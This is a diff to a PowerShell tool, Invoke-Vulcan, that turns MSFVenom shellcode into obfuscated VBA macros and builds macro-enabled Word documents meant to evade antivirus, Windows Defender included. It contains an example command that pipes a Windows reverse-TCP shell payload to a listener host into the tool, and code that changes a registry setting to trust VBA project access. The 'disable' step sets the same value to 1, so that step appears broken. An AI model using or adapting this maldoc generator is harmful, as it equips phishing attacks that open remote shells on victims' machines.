@@ -12,7 +12,7 @@ function Invoke-Vulcan {
         Using MSFVenom creates a macro-enabled Word document that - at the time
         of writing - evade most AVs, including Windows Defender.
 
-    .PARAMETER CaesarShift
+    .PARAMETER Shift
         Specifies the Caesar shift value to use with the xor decoder.
 
     .PARAMETER Decoder
@@ -38,9 +38,9 @@ function Invoke-Vulcan {
   
     .EXAMPLE
         PS C:\>  wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.Visual Basic -CaesarShift 5
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.Visual Basic -Shift 5
 
-        Executes MSFVenom with the specified payload and options, pass the generated raw shellcode to BadAssMacros to obfuscate it in order to evade AVs,
+        Executes MSFVenom with the specified payload and options, pass the generated hex-formatted shellcode to BadAssMacros to obfuscate it in order to evade AVs,
         and then removes creates an empty macro-enabled Word document containing the processed macro.
     #>
 
@@ -54,9 +54,9 @@ function Invoke-Vulcan {
         [String]
         $DecoderPath,
 
-        [ValidateRange(1, 25)]
+        [ValidateRange(-25, 25)]
         [int]
-        $CaesarShift,
+        $Shift,
 
         [ValidateScript({ Test-Path -Path $_ -PathType Container })]
         [String]
@@ -87,18 +87,18 @@ function Invoke-Vulcan {
     Write-Output "[+] Enabling trust access to Visual Basic Project Object Model in Microsoft Word..."
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
 
-    Write-Host "[i] Loading (raw) shellcode..."
-    Create_MacroFromTemplate -CaesarShift $CaesarShift -Decoder $Decoder -DecoderPath $DecoderPath -ShellCode $ShellCode -Template $Template -Treshold $Treshold
+    Write-Verbose "Loading (hex-formatted) shellcode..."
+    Create_MacroFromTemplate -Shift $Shift -Decoder $Decoder -DecoderPath $DecoderPath -ShellCode $ShellCode -Template $Template -Treshold $Treshold
     Create_WordDocument -MacroOutput $MacroOutput -Output $WordOutput
 
-    Write-Host "[-] Removing (Visual Basic) macro file..."
+    Write-Output "[-] Removing (Visual Basic) macro file..."
     Remove-Item -Path $MacroOutput -Force
         
     Write-Output "[+] Disabling trust access to Visual Basic Project Object Model in Microsoft Word..."
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
 }
 
-function Convert-HexArray($HexArray, $Treshold) {
+function Format-HexArray($HexArray, $Treshold) {
     foreach ($x in $HexArray) {
         $x = $x.ToUpper()
 
@@ -140,23 +140,21 @@ function Convert-HexArray($HexArray, $Treshold) {
 
 function Convert-HexToHexArray($ShellCode, $Treshold) {
     $HexArray = $ShellCode -Split '(.{2})' -ne '' 
-    $Payload = Convert-HexArray -HexArray $HexArray -Treshold $Treshold
+    $Payload = Format-HexArray -HexArray $HexArray -Treshold $Treshold
 
     return $Payload.Substring(0, $Payload.Length - 1) 
 }
 
-function Create_MacroFromTemplate($CaesarShift, $Decoder, $DecoderPath, $ShellCode, $Template, $Treshold) {
-    Write-Host "[i] Creating (Visual Basic) macro..."
-    
+function Create_MacroFromTemplate($Shift, $Decoder, $DecoderPath, $ShellCode, $Template, $Treshold) {
+    Write-Verbose "Creating (Visual Basic) macro..."
     $PayloadArray = Convert-HexToHexArray -ShellCode $ShellCode -Treshold $Treshold
-
-    Write-Debug "Payload array: $PayloadArray"
+    Write-Debug "Create_MacroFromTemplate->`$PayloadArray: $PayloadArray"
 
     switch ($Decoder) {
         "caesar" {
             Set-Content -Path $MacroOutput -Value (
                 Get-Content -Path $Template).Replace("PAYLOAD", "Array(" + $PayloadArray + ')' + "`r`n" + "`r`n" + "`t" + "kUG(HoR)")
-            Add-Content -Path $MacroOutput -Value ((Get-Content -Path $DecoderPath).Replace("CaesarShift", $CaesarShift))
+            Add-Content -Path $MacroOutput -Value ((Get-Content -Path $DecoderPath).Replace("Shift", $Shift))
         }
         Default {
             Set-Content -Path $MacroOutput -Value (
@@ -164,18 +162,18 @@ function Create_MacroFromTemplate($CaesarShift, $Decoder, $DecoderPath, $ShellCo
         }
     }
 
-    Write-Host "[i] (Visual Basic) macro written to: $MacroOutput"
+    Write-Output "[+] (Visual Basic) macro written to: $MacroOutput"
 }
 
 function Create_WordDocument($MacroOutput, $Output) {
-    Write-Host "[i] Creating (macro-enabled) Word document..."
+    Write-Verbose "Creating (macro-enabled) Word document..."
     $Word = New-Object -ComObject Word.Application
     $Doc = $Word.Documents.Add()
 
     $DocModule = $Doc.VBProject.VBComponents.Add(1)
     $DocModule.CodeModule.AddFromFile($MacroOutput)
 
-    Write-Host "[+] Word document written to: $Output" 
+    Write-Output "[+] Word document written to: $Output" 
     $Doc.SaveAs($Output, 0)
 
     $Doc.Close()
